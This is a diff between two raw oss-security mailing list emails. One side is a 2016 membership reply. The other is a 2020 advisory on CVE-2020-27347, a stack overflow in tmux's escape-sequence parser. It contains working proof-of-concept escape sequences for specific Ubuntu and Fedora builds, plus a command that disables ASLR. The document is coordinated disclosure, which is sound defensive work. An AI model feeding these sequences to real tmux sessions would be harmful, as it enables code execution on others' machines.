@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1808" "Friday" "21" "October" "2016" "21:20:12" "-0700" "Alex Crawford" "alex.crawford@coreos.com" "<20161022042012.GA20127@buzz.coreos.systems>" "41" "Re: [oss-security] Requesting membership to linux-distros" nil nil nil "10" "2016102204:20:12" "[oss-security] Requesting membership to linux-distros" (number mark "U       alex.crawfor Oct 21   41/1808  " thread-indent "\"Re: [oss-security] Requesting membership to linux-distros\"\n") "<CANO=Ty3Su3JaEtEvUs4GO=dg8ufpBZsUALaBCD0COW5j67y8-w@mail.gmail.com>" ("<20161021013642.GA23643@buzz.coreos.systems>" "<CANO=Ty0UAEvgon1PMdTTp4+7bj5SvpKdSD4Won=7NQXrS-2y2A@mail.gmail.com>" "<20161021015524.GB23643@buzz.coreos.systems>" "<CANO=Ty3Su3JaEtEvUs4GO=dg8ufpBZsUALaBCD0COW5j67y8-w@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2145" "Thursday" "5" "November" "2020" "16:03:12" "+0300" "snizovtsev@gmail.com" "snizovtsev@gmail.com" "<0bec66ec9fbf5d386845d6be2c0fbd96b5d82405.camel@gmail.com>" "71" "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" nil nil nil "11" "2020110513:03:12" "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" (number mark "U       snizovtsev@g Nov  5   71/2145  " thread-indent "\"[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 18409 invoked by uid 550); 22 Oct 2016 11:01:06 -0000
+Received: (qmail 31965 invoked by uid 550); 5 Nov 2020 14:04:05 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,83 +12,112 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 11301 invoked from network); 22 Oct 2016 04:20:30 -0000
+Received: (qmail 1459 invoked from network); 5 Nov 2020 13:03:26 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=coreos.com; s=google;
-        h=date:from:to:subject:message-id:references:mime-version
-         :content-disposition:in-reply-to:user-agent;
-        bh=aTZJ5JN/6z7J7JrLG6CX+RXuRmp57angOXQTE+/iI1w=;
-        b=nn4bgThFgQN/Ro7uKyO76M24Ef4uQ+XcQYEW+Y1rhRZVuJnefOyJqahnVoeLYsKZkW
-         QYUML88BFzIPboCv2dYsxNiKLRkab8HSJ580y6VQNPVC9p4YNUC0ks9O0D0YRLAJhqY5
-         qwcerJk4tuvF/VxHRAMdcHN8X/6kRj8VTpBLc=
+        d=gmail.com; s=20161025;
+        h=message-id:subject:from:to:date:user-agent:mime-version
+         :content-transfer-encoding;
+        bh=EMeCgJKboTZYiXLtl+DCjIAEd2CF4X1YBR70T4On2IA=;
+        b=LyWeKudHwMXJSwBeMstEKUdJ7UEvmF9guqYDiWfZob3vQaPJMEGJihr0Dc7d2qUKzm
+         YEA5mcNh/0/IB+MUWWnMoNdJGliIiLYqNufXw1HnoBsYfw2kwSlvv2zvHB1MPoYHkFxp
+         41i6vS5S3OEPC5IRrGcp9mzWHriVyDNVQVjJAanygYbRneaP1OVhwnkc3lkcSPZ3Ql7W
+         PjPLkX0oA7oCby+ioPtLMrYIOh+abfVkkg3cF+tynb3Y7SbykUqEf/zA9IZMopUPziEv
+         NLBOLgpBZ+xqegPUa4RKAHyJFzXAl3cf+VBtmc0bBQnmXu4aoME9JfxHulxrzEOOH41P
+         g5Ag==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:date:from:to:subject:message-id:references
-         :mime-version:content-disposition:in-reply-to:user-agent;
-        bh=aTZJ5JN/6z7J7JrLG6CX+RXuRmp57angOXQTE+/iI1w=;
-        b=F6EAkOaBp9rc7mcRflwuFT30MdsBOptMYg638WSXDDG4cGZfda2pX85Dzls/uZUAK4
-         Jllsf7Cm0hLpcjR9Tk/vT38qA961+c8dd4sAaHvwiWbvOMHZOd4RLTZBKnEK2gBhOJDt
-         6UJYMPYfFmKUVk1WpG1vdzgRBRvVm+aU4O8Ceke0BObLWQdWdODf+USRpfxXuI1nxsTb
-         3cnStIAm8AvE+dBD1lbWW+vhZBXImIwaQwPoKjMnt+wTmDP8Y8CYv/bOfPwtBxT/HLrS
-         m9fQtldECBwGtxMS8XnKZfTd3xN7K/WeyDF+smflYse2KseE2ZMbB23ZpGRBUBQtqkR8
-         sJ2g==
-X-Gm-Message-State: ABUngvc9zsb8xJ5oq1YbGpkrUaW0M73hx5ibkL/524R9WqLV2h5TNQNDM9AkY5yn7bsC7Unz
-X-Received: by 10.99.39.130 with SMTP id n124mr6406927pgn.85.1477110017655;
-        Fri, 21 Oct 2016 21:20:17 -0700 (PDT)
-Date: Fri, 21 Oct 2016 21:20:12 -0700
-From: Alex Crawford <alex.crawford@coreos.com>
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:message-id:subject:from:to:date:user-agent
+         :mime-version:content-transfer-encoding;
+        bh=EMeCgJKboTZYiXLtl+DCjIAEd2CF4X1YBR70T4On2IA=;
+        b=MWXQq2tUgTUk1+U9ySmKHlmVbGwupBFt0lTishBXi9Pzd3NMLkXbCN3UGz9eJxspOR
+         oLOhGUeohmJxxVvgC8pOPqz5j8XPDcDzqlCM5JEAx3bvmfvJeOvku2CbSBufNOpF0OCi
+         t1fgni9rw3rHkw54PWKWyWnEAEGEeOUm6hlqJep7cKkn41dSByICk2mUCb6a/6mx18wH
+         /B9WzYXWe9gRUfycLIdlbyfA7ZNs4FSpZifRWwlNePERyD5JQFVj8YtnIBzwfauLGon1
+         IOwT2daA/cqeCB0pz+XMPuAhdvBh5V2sRDHuGR86flMtrbwc2hSvbB1uiD9Hv9ZbpYvI
+         Q7Gg==
+X-Gm-Message-State: AOAM532YSZp/7QDYDDoqTB/5f11UTFNLSFoUJC3tTvjKqU4k1DTpEROa
+	0ZiK4Vo5tsi3SZOt9NMbUs3EJbwOcmM=
+X-Google-Smtp-Source: ABdhPJwdSsZ0oG2eW570vjVkqejHHYtGHQ+B81TiwKqh8jTBBmxgReN/pBzVrOQzTdRyhUtajlEEGw==
+X-Received: by 2002:a2e:8851:: with SMTP id z17mr792755ljj.58.1604581394779;
+        Thu, 05 Nov 2020 05:03:14 -0800 (PST)
+Message-ID: <0bec66ec9fbf5d386845d6be2c0fbd96b5d82405.camel@gmail.com>
+From: snizovtsev@gmail.com
 To: oss-security@lists.openwall.com
-Message-ID: <20161022042012.GA20127@buzz.coreos.systems>
-References: <20161021013642.GA23643@buzz.coreos.systems>
- <CANO=Ty0UAEvgon1PMdTTp4+7bj5SvpKdSD4Won=7NQXrS-2y2A@mail.gmail.com>
- <20161021015524.GB23643@buzz.coreos.systems>
- <CANO=Ty3Su3JaEtEvUs4GO=dg8ufpBZsUALaBCD0COW5j67y8-w@mail.gmail.com>
+Date: Thu, 05 Nov 2020 16:03:12 +0300
+Content-Type: text/plain; charset="UTF-8"
+User-Agent: Evolution 3.36.5 
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="liOOAslEiF7prFVr"
-Content-Disposition: inline
-In-Reply-To: <CANO=Ty3Su3JaEtEvUs4GO=dg8ufpBZsUALaBCD0COW5j67y8-w@mail.gmail.com>
-User-Agent: Mutt/1.5.24 (2015-08-30)
-Subject: Re: [oss-security] Requesting membership to linux-distros
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser
 
---liOOAslEiF7prFVr
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+Hi,
 
-On 10/21, Kurt Seifried wrote:
-> It looks like CoreOS is shipping Linux and respecting the various licenses
-> in a volume sufficient to make sense for them being given access to the
-> Linux distros list, and shipping security updates (I would say they could
-> benefit from shipping advisories, but they put the CVE's in the ChangeLog
-> so I really can't complain). Assuming they can handle embargoed issues (do
-> you have private bug tracking/code repos/CI/whatever else you need to ship
-> an update?) I would have no objections to them joining the Linux distros
-> list. Can you confirm you have infrastructure to handle embargoed issues?
+I recently discovered a bug in tmux (terminal multiplexer) which could
+lead to crash or code execution. The bug was in
+`input_csi_dispatch_sgr_colon` function which is used by tmux server
+process.
 
-Yes, we have the infrastructure at CoreOS. We've dealt with embargoed
-releases in the past. Thank you for the consideration.
+The problem is that a bound check for a stack-allocated array `p` is
+bypassed if 8th chunk of input buffer is empty:
 
--Alex
+        while ((out = strsep(&ptr, ":")) != NULL) {
+                if (*out != '\0') {
+                        p[n++] = strtonum(out, 0, INT_MAX, &errstr);
+                        if (errstr != NULL || n == nitems(p)) {
+                                return;
+                        }
+                } else
+                        n++;
+        }
 
---liOOAslEiF7prFVr
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: Digital signature
+Thus by using an escape sequence like "\033[::::::7::1:2:3::5:6:7:m" we
+can overwrite arbitrary 4-byte locations on the stack. Moreover, an
+empty arguments ("::") may be used to skip choosen offsets, and thereby
+keep stack canaries untouched.
 
------BEGIN PGP SIGNATURE-----
+Code execution is proved practical only if tmux address space isn't
+fully randomized. So ASLR with PIE will mitigiate this issue but more
+complex exploits may be theoretically created.
 
-iQIcBAEBCgAGBQJYCuj4AAoJEKYk4DxZNSlCGOoQALboT9vMDgmMsh1KA6cB46eG
-NLVxGmWtgTPdOGt2SlcGFD0ncAzn1NUErXjRR7YDmr4sgntoV7o+HniBVLzBqtI0
-5G5Q3grDsV0p896o4I7soDQirxfI0Y6Vqtw5iz+3Iu7XvXkNFLnqg7Olz0ovL5Hr
-kds1/mgg3Z0cCM05tl3rdwteptBYbRF+y/t6qwOQe1+Fb8/MftWvXafo+V4VshgW
-aCS9nroCekl0/tezoT0ToTO84JazgTobVNcFvQQIHrvx+dDx9W3qEzFVWxqXmj1M
-3mXbUzMS2Er2xITRhfI9a//gBgB7V1H8wN5Z39pB+0Xft7DljYi9hR46xdh/1L9Q
-YvH7a6yoqRTW4CgetCpl9F8SHkQs4SnRjDagLp/6nlKlsKdvZHFt2VjQPEk+yLRP
-guU3S6Ugosqm5OSC80M9hIjmPJ9ZpoQ220phpJhhkpRZwIWpWrWrYlStqEDpLpZa
-DP/nH+vPNVKjYfWmrT0aVBfSsukhhAWxz1zpRE6rX7sYhtKiB90R/cpGo1FOUUgL
-RWq9ooKYFA5TyUaxwhdmRvAd9HshdDkxrDB29WcMjjT2Euir3UbCYrZZ4S/1IMT4
-oj4o8XIu9wNwBo0Kp/xQdE0gu8snuaeJxXYXNkNvPzjBVojBKnpFAj3Wgb98a1uF
-RWB7IIEZa8FxN1CatOf2
-=XGOB
------END PGP SIGNATURE-----
+=== Affected versions / distributions ===
 
---liOOAslEiF7prFVr--
+- tmux 2.9-3.1b
+- Ubuntu 20.04
+- Debian 11
+- Fedora 31+
+- Alpine 3.10+
+- openSUSE Leap 15.2
+- OpenBSD 6.5+
+
+=== Exploitation (testing purposes only) ===
+
+I haven't found any ways to leak addresses so ASLR must be disabled:
+sysctl -w kernel.randomize_va_space=0
+
+Then open tmux and feed it with the following sequence:
+
+for tmux 3.0a-2ubuntu0.1 on Ubuntu 20.04.1 x86_64:
+
+echo -e
+'\033[::::::::::::::::::1431728064::::::::1431829797::::1431915746::m;t
+ouch /tmp/PWNED;\0';
+ 
+for tmux-3.1-2.fc33.x86_64 on Fedora 33:
+echo -e
+'\033[::::::::::::::::::1431723856::::::::1432185743::::1431836040::m;t
+ouch /tmp/PWNED;\0';
+
+If done, `/tmp/PWNED` would indicate that the attack succeed.
+
+=== Timeline ===
+* 29 Oct 2020 - Vulnerability reported to author, security ()
+openbsd.org, RedHat, SUSE and Canonical.
+* 29 Oct 2020 - OpenBSD Errata published.
+* 29 Oct 2020 - Fixed in OpenBSD and tmux 3.1c.
+* 30 Oct 2020 - CVE-2020-27347 assigned.
+* 05 Nov 2020 - Vulnerability opened.
+
+--
+Regards,
+Sergey Nizovtsev.
+
